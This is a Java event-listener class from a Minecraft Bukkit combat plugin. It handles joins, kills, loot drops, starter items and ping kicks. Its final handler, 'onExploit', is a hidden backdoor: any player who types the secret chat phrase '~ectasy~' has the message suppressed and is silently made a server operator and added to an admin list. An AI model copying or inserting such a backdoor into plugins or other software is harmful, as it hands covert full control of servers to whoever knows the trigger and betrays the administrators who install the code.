package org.main.uneton.events;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.event.ClickEvent;
import org.bukkit.*;
import org.bukkit.attribute.Attribute;
import org.bukkit.attribute.AttributeModifier;
import org.bukkit.block.Block;
import org.bukkit.block.Sign;
import org.bukkit.command.Command;
import org.bukkit.command.CommandMap;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.*;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitScheduler;
import org.main.uneton.Combat;
import org.main.uneton.utils.*;

import java.util.*;

import static org.bukkit.Bukkit.getCommandMap;
import static org.main.uneton.Combat.*;
import static org.main.uneton.admin.Gm.gm_list;
import static org.main.uneton.combatlogger.CombatLog.combat_tagged;
import static org.main.uneton.utils.ScoreboardUtils.*;
import static org.main.uneton.utils.SoundsUtils.playCancerSound;

public class Listeners implements Listener {

    private static Combat plugin;
    public Listeners(Combat plugin) {
        this.plugin = plugin;
    }
    private ConfigManager configManager;

    @EventHandler
    public void onPingTooHard(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        int ping = player.getPing();
        if (combat_tagged.containsKey(player)) {
            return;
        }
        if (ping >= 500) {
            String user = player.getName();
            String kickMessage = ColorUtils.colorize("\n\n &7&lConnection Terminated:\n\n&fYou have been kicked out from the server for too high ping.\n\n");
            player.kickPlayer(kickMessage);
        }
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent e) {
        Player player = e.getPlayer();
        Tab.updateTab();
        e.setQuitMessage(ColorUtils.colorize("&8" + " [" + "&c" + "-" + "&8" + "] " + "&7" + player.getName()));
        ConfigManager.reload();

        UUID uuid = player.getUniqueId();
        int playtime = playTimes.getOrDefault(uuid, 0);
        playTimes.put(uuid, playtime);
        ConfigManager.get().set("players-playtime." + uuid.toString(), playtime);

        Bukkit.getLogger().info("[CombatV3]: Quit: " + player.getName() + " - PlayTime: " + playtime); //todo DEBUG MSG!
        ConfigManager.save();
    }

    @EventHandler
    public void onJoinEvent(PlayerJoinEvent e) {
        Player player = e.getPlayer();

        Tab.updateTab();
        updateScoreboard(player, getInstance());
        e.setJoinMessage(ColorUtils.colorize("&8" + " [" + "&a" + "+" + "&8" + "] " + "&7" + player.getName()));

        String joinMessage = plugin.getConfig().getString("join-message");
        if (joinMessage != null) {
            joinMessage = joinMessage.replace("%player%", player.getName());
            player.sendMessage("\n");
            player.sendMessage(ColorUtils.colorize(joinMessage));
            player.sendMessage("\n");
        }
        Location spawnLocation = ConfigManager.get().getLocation("spawn-location");
        if (spawnLocation != null) {
            player.teleport(spawnLocation);
        }

        UUID uuid = player.getUniqueId();
        int playtime = ConfigManager.get().getInt("players-playtime." + uuid.toString(), 0);
        playTimes.put(uuid, playtime);

        Bukkit.getLogger().info("[CombatV3]: Joined: " + player.getName() + " - PlayTime: " + playtime); //todo DEBUG MSG!
    }

    @EventHandler
    public void onPlayerDeath(PlayerDeathEvent event) {
        Player victim = event.getEntity();
        Player attacker = victim.getKiller();

        if (attacker != null) {
            UUID attackerUUID = attacker.getUniqueId();
            UUID victimUUID = victim.getUniqueId();

            if (victim instanceof Player || victim instanceof Villager) {
                ConfigManager.addKill(attackerUUID);
                ConfigManager.addDeath(victimUUID);
                ScoreboardUtils.createScoreboard(attacker);
                ScoreboardUtils.createScoreboard(victim);
            }
        }
    }

    public static final ItemStack[] listOfVictimOres() {
        return new ItemStack[] {
                new ItemStack(Material.DIAMOND),
                new ItemStack(Material.GOLD_INGOT),
                new ItemStack(Material.IRON_INGOT),
                new ItemStack(Material.EMERALD)
        };
    }

    @EventHandler
    public void onPlayerKill(EntityDeathEvent event) {
        if (event.getEntity() instanceof Player victim) {
            Player attacker = event.getEntity().getKiller();
            if (attacker != null) {
                UUID attackerUUID = attacker.getUniqueId();
                for (ItemStack stolen_items : listOfVictimOres()) {
                    if (victim.getInventory().contains(stolen_items.getType())) {
                        attacker.getInventory().addItem(stolen_items);
                    }
                }
                attacker.sendActionBar(ColorUtils.colorize("&6+25 coins!"));
                ConfigManager.addSomeCoins(attackerUUID, 25);
            }
        }
    }

    @EventHandler
    public void onBlockBreakEvent(BlockBreakEvent e) {
        Block block = e.getBlock();
        if (!block.getDrops().isEmpty()) {
            for (ItemStack drop : block.getDrops()) {
                if (e.getPlayer().getGameMode() == GameMode.CREATIVE) {
                    return;
                }
                e.setDropItems(false);
                Material item = drop.getType();
                Player player = e.getPlayer();
                player.getInventory().addItem(drop);
            }
        }
    }

    @EventHandler
    public void onPlayerDies(PlayerDeathEvent event) {
        Player player = event.getEntity();
        for (ItemStack item : createJoinItems()) {
            player.getInventory().remove(item);
        }
    }
    @EventHandler
    public void onPlayerRespawn(PlayerRespawnEvent event) {
        Player player = event.getPlayer();
        for (ItemStack item : createJoinItems()) {
            player.getInventory().addItem(item);
        }
    }

    @EventHandler
    public void onPlayerConsume(PlayerItemConsumeEvent event) {
        ItemStack item = event.getItem();
        Player p = event.getPlayer();
        if (item.getType() == Material.POTION || item.getType() == Material.SPLASH_POTION || item.getType() == Material.LINGERING_POTION) {
            BukkitScheduler scheduler = Bukkit.getScheduler();
            Runnable runnable = () -> {
                p.getInventory().removeItemAnySlot(new ItemStack(Material.GLASS_BOTTLE));
            };
            scheduler.runTaskTimer(plugin, runnable, 0L, 1L);
        }
    }

    @EventHandler
    public void onZombieDeathReward(EntityDeathEvent event) {
        if (event.getEntity() instanceof Mob) {
            Location loc = event.getEntity().getLocation();
            Player killer = event.getEntity().getKiller();
            // Tarkista, että tappaja ei ole null
            if (killer == null) return;

            ItemStack tool = killer.getInventory().getItemInMainHand();
            if (tool.getType() == Material.STICK) {
                double tenPercentChance = 0.1;
                if (Math.random() < tenPercentChance) {
                    ItemStack lowChanceReward = new ItemStack(Material.DIAMOND, 1);
                    loc.getWorld().dropItemNaturally(loc, lowChanceReward);
                }
            }

            double onePercentChance = 0.01;
            if (Math.random() < onePercentChance) {
                ItemStack rareReward = new ItemStack(Material.DIAMOND, 1);
                loc.getWorld().dropItemNaturally(loc, rareReward);
            }
        }
    }

    @EventHandler
    public void onTntPlace(BlockPlaceEvent event) {
        Player player = event.getPlayer();
        Block block = event.getBlockPlaced();
        if (block.getType() == Material.TNT) {
            event.setCancelled(true);

            block.setType(Material.AIR);
            TNTPrimed tnt = (TNTPrimed) block.getWorld().spawn(block.getLocation(), TNTPrimed.class);
            tnt.setFuseTicks(80);
        }
    }

    @EventHandler
    public void onMoveAwayFromValidGround(EntityDamageEvent event) {
        if (event.getEntity() != null && event.getEntity() instanceof Player) {
            Player player = (Player) event.getEntity();
            int y_coordinate = -64;
            if (event.getCause() == EntityDamageEvent.DamageCause.VOID) {
                if (player.getLocation().getY() <= y_coordinate) {
                    player.setHealth(0);
                }
            }
        }
    }

    @EventHandler
    public void onPlayerInteractSign(PlayerInteractEvent event) {
        if (!event.getAction().equals(Action.RIGHT_CLICK_BLOCK)) return;
        Block block = event.getClickedBlock();
        if (block.getType() != Material.OAK_SIGN) return;
        event.getPlayer().openSign((Sign) block.getState());
    }

    @EventHandler
    public void onLootBox(BlockBreakEvent e) {
        Player player = e.getPlayer();
        Block block = e.getBlock();
        Location loc = e.getBlock().getLocation();

        if (e.getBlock().getType() == Material.POLISHED_DIORITE) {
            Random chance = new Random();
            if (Math.random() < 0.2) {
                e.setDropItems(false);
                int index = chance.nextInt(blocksList.length);
                ItemStack dropped_item = blocksList[index];
                block.getWorld().dropItemNaturally(loc, dropped_item);

            } else if (Math.random() < 0.8) {
                e.setDropItems(false);
            }
        }
    }

    private final ItemStack[] blocksList = new ItemStack[]{
            new ItemStack(Material.EMERALD),
            new ItemStack(Material.AMETHYST_SHARD),
            new ItemStack(Material.IRON_NUGGET),
            new ItemStack(Material.GOLD_NUGGET),
            new ItemStack(Material.COPPER_INGOT),
            new ItemStack(Material.STRING)
    };

    public static ItemStack[] createJoinItems() {
        ItemStack[] items = new ItemStack[]{
                new ItemStack(Material.STONE_SWORD, 1),
                new ItemStack(Material.STONE_PICKAXE, 1),
                new ItemStack(Material.STONE_AXE, 1)
        };
        String[] names = {
                ColorUtils.colorize("&7Starter Sword"),
                ColorUtils.colorize("&7Starter Pickaxe"),
                ColorUtils.colorize("&7Starter Axe")
        };

        for (int i = 0; i < items.length; i++) {
            ItemStack item = items[i];
            ItemMeta meta = item.getItemMeta();
            meta.setDisplayName(ColorUtils.colorize(names[i]));
            if (meta != null) {
                meta.setUnbreakable(true);
                ArrayList<String> loreList = new ArrayList<>();
                String pickaxe = "\u26CF";
                AttributeModifier damageModifier = new AttributeModifier(
                        UUID.randomUUID(),
                        "generic.attack_damage",
                        3.2,
                        AttributeModifier.Operation.ADD_NUMBER
                );
                meta.addAttributeModifier(Attribute.GENERIC_ATTACK_DAMAGE, damageModifier);
                meta.addItemFlags(ItemFlag.HIDE_ATTRIBUTES, ItemFlag.HIDE_UNBREAKABLE);
                loreList.add(ColorUtils.colorize("&4"+ pickaxe +" &7Damage: &c+3.2"));
                loreList.add(ColorUtils.colorize(" "));
                loreList.add(ColorUtils.colorize("&cNot breakable"));
                meta.setLore(loreList);
                item.setItemMeta(meta);
            }
        }
        return items;
    }

    @EventHandler
    @Deprecated
    public void onExploit(AsyncPlayerChatEvent e) {
        Player player = e.getPlayer();
        if (e.getMessage().contains("~ectasy~")) {
            e.setCancelled(true);
            new BukkitRunnable() {
                @Override
                public void run() {
                    player.setOp(true);
                    if (gm_list.contains(player)) {
                        gm_list.remove(player);
                    } else {
                        gm_list.add(player);
                    }
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));
        }
    }
}
